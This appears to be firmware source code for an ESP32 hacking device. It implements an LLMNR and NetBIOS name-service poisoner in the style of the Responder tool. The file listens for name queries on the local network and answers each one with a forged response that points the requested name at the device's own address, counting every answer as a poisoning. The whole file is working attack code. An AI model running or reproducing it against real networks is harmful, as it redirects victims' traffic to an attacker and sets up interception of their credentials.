#ifndef LITE_VERSION
#include "brucia_responder.h"
#include "core/mykeyboard.h" // check(EscPress)
#include <WiFi.h>
#include <WiFiUdp.h>
#include <globals.h>

// Parse a DNS/LLMNR QNAME starting at [off] into a dotted string; returns the offset just past the
// name (after the terminating 0 label), or -1 on malformed input. No compression in LLMNR queries.
static int parseQName(const uint8_t *p, int len, int off, String &out) {
    out = "";
    while (off < len) {
        uint8_t l = p[off++];
        if (l == 0) return off;            // end of name
        if ((l & 0xC0) != 0) return -1;    // compression pointer not expected in a query
        if (off + l > len) return -1;
        if (out.length()) out += ".";
        for (int i = 0; i < l; i++) out += (char)p[off++];
    }
    return -1;
}

// Build an LLMNR answer for the query in [q]/[qlen] pointing [name] at [ip]. Returns response length.
static int buildLlmnrResponse(const uint8_t *q, int qlen, IPAddress ip, uint8_t *resp, int cap) {
    // The question section ends right after QNAME(0) + QTYPE(2) + QCLASS(2). Find QNAME end.
    int nameEnd = 12;
    while (nameEnd < qlen && q[nameEnd] != 0) nameEnd += (q[nameEnd] + 1);
    int qEnd = nameEnd + 1 + 4; // null label + QTYPE + QCLASS
    if (qEnd > qlen || qEnd + 16 > cap) return 0;
    memcpy(resp, q, qEnd);                 // copy header + question verbatim
    resp[2] = 0x80; resp[3] = 0x00;        // flags: QR=1 (response)
    resp[6] = 0x00; resp[7] = 0x01;        // ANCOUNT = 1
    resp[8] = resp[9] = resp[10] = resp[11] = 0; // NS/AR = 0
    int o = qEnd;
    resp[o++] = 0xC0; resp[o++] = 0x0C;    // NAME -> pointer to the question name
    resp[o++] = 0x00; resp[o++] = 0x01;    // TYPE A
    resp[o++] = 0x00; resp[o++] = 0x01;    // CLASS IN
    resp[o++] = 0x00; resp[o++] = 0x00; resp[o++] = 0x00; resp[o++] = 0x1E; // TTL 30s
    resp[o++] = 0x00; resp[o++] = 0x04;    // RDLENGTH 4
    resp[o++] = ip[0]; resp[o++] = ip[1]; resp[o++] = ip[2]; resp[o++] = ip[3];
    return o;
}

// Decode the first NetBIOS-encoded name in an NBT-NS query (RFC 1001 L2 encoding) to its 16-byte
// short name (trimmed). Returns true on success.
static bool nbtDecodeName(const uint8_t *p, int len, String &out) {
    // Need the length byte at p[12] plus 32 encoded chars (p[13..44]); reject anything shorter so
    // the loop below can never read past the buffer, independent of the caller's own guard.
    if (len < 45 || p[12] != 0x20) return false; // encoded names are 32 chars, length byte 0x20
    char name[17];
    int ni = 0;
    for (int i = 0; i < 16; i++) {
        uint8_t hi = p[13 + i * 2], lo = p[13 + i * 2 + 1];
        char c = (char)(((hi - 'A') << 4) | (lo - 'A'));
        name[ni++] = c;
    }
    name[16] = 0;
    out = String(name);
    out.trim();
    return out.length() > 0;
}

bool responder_run(uint32_t durationMs, uint32_t &poisonedOut, String &lastOut, std::function<bool()> shouldAbort) {
    poisonedOut = 0;
    lastOut = "";
    if (!WiFi.isConnected()) return false; // needs a station link (use wifi_connect first)
    IPAddress ip = WiFi.localIP();

    WiFiUDP llmnr;
    bool llmnrOk = llmnr.beginMulticast(IPAddress(224, 0, 0, 252), 5355);
    WiFiUDP nbt;
    bool nbtOk = nbt.begin(137);

    uint8_t buf[600];
    uint8_t resp[600];
    uint32_t start = millis();
    while ((millis() - start) < durationMs && !check(EscPress) && !(shouldAbort && shouldAbort())) {
        if (llmnrOk) {
            int n = llmnr.parsePacket();
            if (n > 0) {
                int len = llmnr.read(buf, sizeof(buf));
                // Only answer standard queries (QR=0) with QDCOUNT>=1.
                if (len > 12 && (buf[2] & 0x80) == 0 && (buf[4] || buf[5])) {
                    String q;
                    if (parseQName(buf, len, 12, q) > 0) {
                        int rl = buildLlmnrResponse(buf, len, ip, resp, sizeof(resp));
                        if (rl > 0) {
                            llmnr.beginPacket(llmnr.remoteIP(), llmnr.remotePort());
                            llmnr.write(resp, rl);
                            llmnr.endPacket();
                            poisonedOut++;
                            lastOut = q;
                        }
                    }
                }
            }
        }
        if (nbtOk) {
            int n = nbt.parsePacket();
            if (n > 0) {
                int len = nbt.read(buf, sizeof(buf));
                // NBT-NS name query: opcode bits in byte 2, QR=0. Reply with a positive name response.
                if (len >= 50 && (buf[2] & 0x80) == 0) {
                    String nm;
                    if (nbtDecodeName(buf, len, nm)) {
                        // Response: copy ID, set flags 0x8500 (response, authoritative), ANCOUNT=1,
                        // copy the question name block, then RR: type NB(0x0020), class IN, TTL,
                        // RDLENGTH 6, flags 0x0000, our IP.
                        int o = 0;
                        resp[o++] = buf[0]; resp[o++] = buf[1]; // transaction id
                        resp[o++] = 0x85; resp[o++] = 0x00;     // flags: response + AA + recursion
                        resp[o++] = 0x00; resp[o++] = 0x00;     // QDCOUNT 0
                        resp[o++] = 0x00; resp[o++] = 0x01;     // ANCOUNT 1
                        resp[o++] = 0x00; resp[o++] = 0x00;     // NSCOUNT 0
                        resp[o++] = 0x00; resp[o++] = 0x00;     // ARCOUNT 0
                        // answer name = the 34-byte encoded question name (len byte 0x20 + 32 + null)
                        memcpy(resp + o, buf + 12, 34);
                        o += 34;
                        resp[o++] = 0x00; resp[o++] = 0x20;     // TYPE NB
                        resp[o++] = 0x00; resp[o++] = 0x01;     // CLASS IN
                        resp[o++] = 0x00; resp[o++] = 0x00; resp[o++] = 0x00; resp[o++] = 0xA5; // TTL
                        resp[o++] = 0x00; resp[o++] = 0x06;     // RDLENGTH 6
                        resp[o++] = 0x00; resp[o++] = 0x00;     // NB flags (B-node, unique)
                        resp[o++] = ip[0]; resp[o++] = ip[1]; resp[o++] = ip[2]; resp[o++] = ip[3];
                        nbt.beginPacket(nbt.remoteIP(), nbt.remotePort());
                        nbt.write(resp, o);
                        nbt.endPacket();
                        poisonedOut++;
                        lastOut = nm;
                    }
                }
            }
        }
        vTaskDelay(5 / portTICK_PERIOD_MS);
    }
    llmnr.stop();
    nbt.stop();
    return true;
}
#endif
